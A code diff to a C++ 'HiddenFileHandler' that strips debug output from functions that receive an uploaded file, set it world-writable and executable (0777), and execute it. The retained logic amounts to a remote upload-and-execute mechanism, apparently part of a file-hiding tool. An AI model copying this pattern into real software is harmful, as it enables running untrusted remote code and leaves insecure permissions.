@@ -59,7 +59,6 @@ Status HiddenFileHandler::runFile(const std::string& fileName) {
         std::exit(EXIT_FAILURE);
     }
 #endif
-    std::cerr << "exec hidden file" << std::endl;
     if (execl(filePath.c_str(), "", NULL) == -1) {
         std::cerr << "didn't run hidden file, Error: " << strerror(errno) << std::endl;
         std::cerr << "address: " << filePath << std::endl;
@@ -107,14 +106,12 @@ Status HiddenFileHandler::uploadFile(const std::string& fileName, uint32_t fileS
     std::string filePath = getPath(fileName);
     std::ofstream outFile;
     outFile.open(filePath, std::ios::binary | std::ios::out); // open and overwrite file
-    std::cerr << "1\n";
 
     if (!outFile) {
         return FILE_NOT_OPEN_ERROR;
     }
     uint32_t ctr = 0;
     int recived = 0;
-    std::cerr << "2\n";
     for (ctr = 0; ctr < fileSize && res == SUCCSESS; ctr += recived)
     {
         int tranferAmount = MIN(sizeof(fileContent), fileSize - ctr);
@@ -127,16 +124,14 @@ Status HiddenFileHandler::uploadFile(const std::string& fileName, uint32_t fileS
         }
         
         if (recived == 0) {
-            std::cerr << "transferAmount: " << tranferAmount << "\nrecived: " << recived << std::endl;
-            std::cerr << "fileSize - ctr: " << fileSize - ctr << std::endl;
-            std::cerr << "Hider recived 0 and stops reciving\n";
+            //std::cerr << "transferAmount: " << tranferAmount << "\nrecived: " << recived << std::endl;
+            //std::cerr << "fileSize - ctr: " << fileSize - ctr << std::endl;
+            //std::cerr << "Hider recived 0 and stops reciving\n";
             if (ctr < fileSize) {
                 res = HIDER_DIDNT_RECV_ENTIRE_UPLOAD;
             }
             break;
         }
-        // std::cerr << "3\n";
-
 
         outFile.write(fileContent, recived);
         if (!outFile) {
@@ -145,20 +140,16 @@ Status HiddenFileHandler::uploadFile(const std::string& fileName, uint32_t fileS
             res = FILE_WRITE_ERROR;
         }
     }
-    std::cerr << "4\n";
     outFile.close();
-
 
     if (res != SUCCSESS) {
         return res;
     }
-    std::cerr << "5\n";
-
+    
     if (chmod(filePath.c_str(), S_IRWXU | S_IRWXG | S_IRWXO) != 0)
     {
         std::cerr << "Failed to set executable permission." << std::endl;
         return CHMOD_TO_EXE_ERROR;
     }
-    std::cerr << "6\n";
     return SUCCSESS;
 }
